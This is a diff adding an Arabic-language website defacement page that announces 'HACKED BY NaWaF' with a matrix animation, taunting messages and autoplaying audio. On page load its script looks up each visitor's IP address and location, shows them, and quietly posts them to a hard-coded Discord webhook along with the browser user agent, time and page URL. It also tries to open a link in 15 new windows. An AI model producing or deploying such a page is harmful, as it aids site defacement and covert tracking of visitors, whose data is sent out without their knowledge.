@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>NaWaF</title>
+
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+
+  <style>
+    :root{
+      --red: #ff0000;
+      --accent: #FF4500;
+      --panel-bg: rgba(0,0,0,0.75);
+      --bg: #000;
+    }
+    *{box-sizing:border-box}
+    body{
+      margin:0; padding:0;
+      height:100vh; width:100vw;
+      display:flex; justify-content:center; align-items:center;
+      background:var(--bg);
+      font-family: 'Cairo', "Courier New", monospace;
+      color:var(--red);
+      overflow:hidden; position:relative;
+    }
+
+    /* خلفية منقطة وMatrix */
+    body::before{
+      content:""; position:absolute; inset:0;
+      background-image: radial-gradient(var(--red) 1px, transparent 1px);
+      background-size:20px 20px; opacity:0.12; z-index:0;
+    }
+    canvas#matrix{ position:absolute; inset:0; z-index:0; opacity:0.22; }
+
+    /* الشريط الأيسر */
+    .sidebar{
+      position:absolute; top:20px; left:20px; z-index:4;
+      background:var(--panel-bg); border:1px solid rgba(255,0,0,0.06);
+      padding:12px 14px; border-radius:10px; color:var(--red);
+      text-shadow:0 0 8px rgba(255,0,0,0.12); max-width:260px; font-size:14px;
+      line-height:1.6;
+    }
+    .discord-btn{ display:flex; gap:8px; align-items:center; margin-top:12px;
+      padding:8px 10px; background:transparent; border:1px solid rgba(255,0,0,0.08);
+      border-radius:6px; color:var(--red); text-decoration:none; font-weight:600;
+      justify-content:center;}
+    .discord-btn:hover{ background:var(--red); color:#000; }
+
+    /* المربع الأيمن */
+    .right-panel{
+      position:absolute; top:20px; right:20px; z-index:4;
+      width:320px; max-width:36vw;
+      background:linear-gradient(180deg, rgba(0,0,0,0.78), rgba(8,8,8,0.6));
+      border:1px solid rgba(255,69,0,0.12); border-radius:10px; padding:14px;
+      box-shadow:0 0 18px rgba(255,0,0,0.06); color:#ffcaca; text-align:right;
+      font-size:15px; line-height:1.6; backdrop-filter: blur(2px);
+      direction: rtl;
+    }
+    .right-panel h4{ margin:0 0 8px 0; color:var(--accent); font-weight:700; }
+
+    .line{
+      opacity:0; transform:translateY(8px);
+      transition: all 420ms cubic-bezier(.2,.9,.22,1);
+      margin:8px 0; padding:8px 10px; border-radius:6px;
+      background:linear-gradient(90deg, rgba(0,0,0,0.45), rgba(0,0,0,0.2));
+      border:1px solid rgba(255,0,0,0.04); box-shadow:0 0 8px rgba(255,0,0,0.02);
+      word-break: break-word; white-space: normal; text-align: right;
+    }
+    .line.visible{ opacity:1; transform:translateY(0); }
+
+    .tag{ display:inline-block; color:var(--accent); font-weight:700; margin-left:8px; font-size:13px; }
+
+    /* الصندوق المركزي والفيديو
+    .video-box{ z-index:2; display:flex; flex-direction:column; align-items:center; gap:12px;
+      width:calc(100% - 160px); max-width:1000px; padding:0 40px; }
+    .video-frame{ width:680px; max-width:78vw; aspect-ratio:16/9; border-radius:12px; overflow:hidden;
+      border:1px solid rgba(255,0,0,0.06); box-shadow:0 0 40px rgba(255,0,0,0.06); background:#000; }
+    video#bg-video{ width:100%; height:100%; object-fit:cover; display:block; }
+
+    .box{
+      width:680px; max-width:78vw;
+      background:linear-gradient(180deg, rgba(0,0,0,0.65), rgba(0,0,0,0.55));
+      border:1px solid rgba(255,0,0,0.06); padding:12px 16px; border-radius:10px;
+      text-align:center; box-shadow:0 6px 30px rgba(255,0,0,0.03); font-weight:600; letter-spacing:0.6px;
+    }
+    .banner{ font-size:22px; color:#ffeaea; text-shadow:0 0 12px rgba(255,0,0,0.25); font-weight:800; }
+
+    @media (max-width:900px){
+      .right-panel{ width:44vw; max-width:300px; font-size:14px }
+      .video-frame{ width:86vw }
+      .box{ width:86vw }
+    } */
+  </style>
+</head>
+<body>
+
+  <canvas id="matrix"></canvas>
+
+  <div class="sidebar" role="navigation">
+    <strong>:</strong>
+    <div style="margin-top:8px">- بعيوني النمروديه</div>
+    <div>- بعيوني النوفي </div>
+    <div>-  بعيوني كوكو</div>
+    <div>- NaWaF is here</div>
+    <!-- <a class="discord-btn" href="https://discord.gg/" target="_blank" rel="noopener">Join Discord</a> -->
+  </div>
+
+  <div class="right-panel" aria-live="polite" aria-atomic="true">
+    <h4>رسائل النظام</h4>
+    <div class="line" id="line-1"><span class="tag">01</span> <span id="t1"></span></div>
+    <div class="line" id="line-2"><span class="tag">02</span> <span id="t2"></span></div>
+    <div class="line" id="line-3"><span class="tag">03</span> <span id="t3"></span></div>
+    <div class="line" id="line-4"><span class="tag">04</span> <span id="t4"></span></div>
+  </div>
+
+<div class="video-box" role="main">
+
+  <!-- الصورة -->
+  <img 
+    src="https://i.imgur.com/vJVT1Ef.png" 
+    alt="banner"
+    class="top-image"
+  >
+
+<audio id="bg-audio" autoplay loop>
+  <source src="https://l.top4top.io/m_3796zmwa21.mp3" type="audio/mpeg">
+</audio>
+
+<script>
+window.addEventListener('load', () => {
+  const audio = document.getElementById('bg-audio');
+  audio.volume = 1.0;
+
+  const playAudio = () => {
+    audio.play().catch(() => {});
+  };
+
+  playAudio();
+
+  document.addEventListener('click', playAudio, { once: true });
+});
+</script>
+
+  <div class="box banner">HACKED BY NaWaF</div>
+  <div class="box" id="ip-info">جاري جلب بيانات الشبكة...</div>
+  <div class="box footer">NaWaF - inspirer</div>
+
+</div>
+
+<style>
+.video-box{
+  position: relative;
+  width: 400px;
+  margin: auto;
+  text-align: center;
+}
+
+.top-image{
+  width: 100%;
+  border-radius: 15px;
+  margin-bottom: 10px;
+}
+
+.video-frame video{
+  width: 100%;
+  border-radius: 15px;
+}
+
+.box{
+  margin-top: 10px;
+  color: white;
+}
+</style>
+
+  <script>
+    /* Matrix rain */
+    const canvas = document.getElementById('matrix');
+    const ctx = canvas.getContext('2d');
+    const FONT_SIZE = 14;
+    let cols, drops;
+    function fitCanvas(){
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+      cols = Math.floor(canvas.width / FONT_SIZE);
+      drops = new Array(cols).fill(1);
+    }
+    window.addEventListener('resize', fitCanvas);
+    fitCanvas();
+    function matrixDraw(){
+      ctx.fillStyle = 'rgba(0,0,0,0.06)';
+      ctx.fillRect(0,0,canvas.width,canvas.height);
+      ctx.fillStyle = '#F00';
+      ctx.font = FONT_SIZE + 'px monospace';
+      for(let i=0;i<drops.length;i++){
+        const ch = Math.random() > 0.5 ? '0':'1';
+        ctx.fillText(ch, i*FONT_SIZE, drops[i]*FONT_SIZE);
+        if(drops[i]*FONT_SIZE > canvas.height && Math.random() > 0.975) drops[i]=0;
+        drops[i]++;
+      }
+    }
+    setInterval(matrixDraw, 33);
+
+    /* جلب بيانات IP بعد 2 ثانية */
+    setTimeout(()=> {
+      fetch('https://ipinfo.io/json')
+        .then(r=>r.json())
+        .then(data=>{
+          document.getElementById('ip-info').innerHTML = `
+            <strong>IP:</strong> ${data.ip || 'N/A'}<br>
+            <strong>City:</strong> ${data.city || 'N/A'}<br>
+            <strong>Region:</strong> ${data.region || 'N/A'}<br>
+            <strong>Country:</strong> ${data.country || 'N/A'}<br>
+            <strong>Timezone:</strong> ${data.timezone || 'N/A'}
+          `;
+        })
+        .catch(()=>{ document.getElementById('ip-info').textContent = 'فشل جلب البيانات.' });
+    }, 2000);
+
+    /* تمكين صوت الفيديو بعد أول تفاعل */
+    const video = document.getElementById('bg-video');
+    const enableSound = ()=>{ try{ video.muted=false; video.play().catch(()=>{});}catch(e){}; 
+      document.removeEventListener('click', enableSound); document.removeEventListener('touchstart', enableSound); };
+    document.addEventListener('click', enableSound, {once:true});
+    document.addEventListener('touchstart', enableSound, {once:true});
+
+    /* رسائل الاختراق — مختصرة ومصممة للظهور بشكل جيد */
+    const messages = [
+      "السلام عليكم ورحمة الله وبركاته",
+      "تم اختراق السيرفر من NaWaF",
+      "where are you يا متحدي"
+    ];
+
+    /* دالة كتابة تدريجية */
+    function typeText(el, text, speed=28){
+      el.textContent = '';
+      let i=0;
+      return new Promise(res=>{
+        const iv = setInterval(()=>{
+          el.textContent += text.charAt(i);
+          i++;
+          if(i>=text.length){ clearInterval(iv); res(); }
+        }, speed);
+      });
+    }
+
+    /* إظهار الرسائل تدريجياً */
+    async function revealMessages(){
+      for(let i=0;i<messages.length;i++){
+        const line = document.getElementById('line-'+(i+1));
+        const target = document.getElementById('t'+(i+1));
+        line.classList.add('visible');
+        await typeText(target, messages[i], 28);
+        await new Promise(r=>setTimeout(r, 1200));
+      }
+      
+      // بعد انتهاء كتابة جميع الرسائل، انتظر 5 ثوانٍ ثم افتح رابط الديسكورد عدة مرات
+      await new Promise(r=>setTimeout(r, 5000));
+      openDiscordLinks();
+    }
+
+    /* فتح رابط الديسكورد عدة مرات */
+      function openDiscordLinks() {
+        const discordUrl = '';
+        const numberOfTimes = 15; // عدد ثابت 15 مرة
+        
+        console.log(`سيتم فتح رابط الديسكورد ${numberOfTimes} مرة`);
+        
+        for(let i = 0; i < numberOfTimes; i++) {
+          setTimeout(() => {
+            try {
+              window.open(discordUrl, '_blank', 'noopener,noreferrer');
+              console.log(`تم فتح الرابط - المرة رقم ${i + 1}`);
+            } catch (error) {
+              console.error(`خطأ في فتح الرابط - المرة رقم ${i + 1}:`, error);
+            }
+          }, i * 200); // تأخير 200ms بين كل فتحة
+        }
+      }
+    
+    setTimeout(revealMessages, 800);
+
+    /* إرسال إشعار إلى الويب هوك عند فتح الصفحة */
+    async function sendWebhookNotification() {
+      try {
+        // جمع معلومات المستخدم
+        const userAgent = navigator.userAgent;
+        const timestamp = new Date().toLocaleString('ar-SA', {
+          timeZone: 'Asia/Riyadh',
+          year: 'numeric',
+          month: '2-digit',
+          day: '2-digit',
+          hour: '2-digit',
+          minute: '2-digit',
+          second: '2-digit'
+        });
+        
+        // الحصول على معلومات IP (سيتم جلبها من الكود الموجود)
+        let ipInfo = 'جاري الحصول على البيانات...';
+        try {
+          const ipResponse = await fetch('https://ipinfo.io/json');
+          const ipData = await ipResponse.json();
+          ipInfo = `IP: ${ipData.ip || 'غير معروف'} | المدينة: ${ipData.city || 'غير معروف'} | البلد: ${ipData.country || 'غير معروف'}`;
+        } catch (e) {
+          ipInfo = 'فشل في جلب بيانات IP';
+        }
+
+        // إعداد رسالة الديسكورد
+        const webhookData = {
+          embeds: [{
+            title: "🚨 تم فتح صفحة NaWaF hack ",
+            description: "شخص جديد دخل إلى الصفحة",
+            color: 16711680, // اللون الأحمر
+            fields: [
+              {
+                name: "📍 معلومات الموقع",
+                value: ipInfo,
+                inline: false
+              },
+              {
+                name: "🌐 المتصفح",
+                value: userAgent,
+                inline: false
+              },
+              {
+                name: "⏰ الوقت",
+                value: timestamp,
+                inline: true
+              },
+              {
+                name: "🔗 الرابط",
+                value: window.location.href,
+                inline: true
+              }
+            ],
+            footer: {
+              text: "NaWaF  log - Visitor Tracker",
+              icon_url: "https://cdn.discordapp.com/emojis/741243929684074507.png"
+            },
+            timestamp: new Date().toISOString()
+          }]
+        };
+
+        // إرسال الرسالة إلى الويب هوك
+        const webhookUrl = 'https://canary.discord.com/api/webhooks/1508198969749274776/FfB4TxNGQAX2mZnX_tZWku5rWgVbBZjejxTTdY9hLBMQEIzm_06Z4yO0EYiU3zatW2hF';
+        
+        await fetch(webhookUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(webhookData)
+        });
+
+        console.log('تم إرسال الإشعار بنجاح إلى الديسكورد');
+      } catch (error) {
+        console.error('خطأ في إرسال الإشعار:', error);
+      }
+    }
+
+    // إرسال الإشعار عند تحميل الصفحة (بعد تأخير قصير للتأكد من تحميل كل شيء)
+    setTimeout(sendWebhookNotification, 1500);
+  </script>
+</body>
+</html>
